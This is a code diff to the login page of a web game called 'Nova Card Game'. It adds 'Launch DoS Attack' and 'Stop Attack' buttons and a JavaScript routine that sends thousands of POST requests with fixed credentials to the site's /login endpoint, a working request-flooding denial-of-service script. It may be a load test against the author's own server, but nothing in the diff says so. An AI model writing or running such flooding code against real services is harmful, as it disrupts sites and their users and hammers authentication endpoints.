@@ -112,6 +112,48 @@
 	
 	</noscript>
 	
+	<button id="dosbtn" onclick="DoS(0)">Launch DoS Attack</button>
+	<button is="dosstopbtn" onclick="stopDoS()">Stop Attack</button>
+	
+	<script>
+		var dosStop = 0;
+		var dosBtn = document.getElementById("dosbtn");
+		function DoS(index){
+			if(index == 0){
+				dosStop = 0;
+			}
+			console.log("ATK-Set n. " + index);
+			var xhttp = new XMLHttpRequest();
+			xhttp.onreadystatechange = function() {
+				if (this.readyState == 4 && this.status == 200) {
+					console.log("Response: " + this.responseText);
+				}
+			};
+			var request = "/login";
+			var params = "username=hacker&password=123";
+			
+			for(var i=0; i<5000 && dosStop == 0; i++){
+				console.log("Request n. " + (i+1));
+				dosBtn.innerHTML = "Set " + index + " Request n. " + (i+1);
+				xhttp.open("POST", request, true);
+				xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+				xhttp.send(params);
+			}
+			if(index < 10 && dosStop == 0){
+				setTimeout(DoS,20,++index);
+			}
+			else{
+				
+				dosBtn.innerHTML = "Attack finished, start new one";
+			}
+		}
+		
+		function stopDoS(){
+			dosStop = 1;
+			console.log("Attack stopped");
+		}
+	</script>
+	
 	<h1 class="title">Nova Card Game</h1>
 	<div id="logindiv" class="centered" style="display: none">
 		<form id="form" action="/login" method="post">
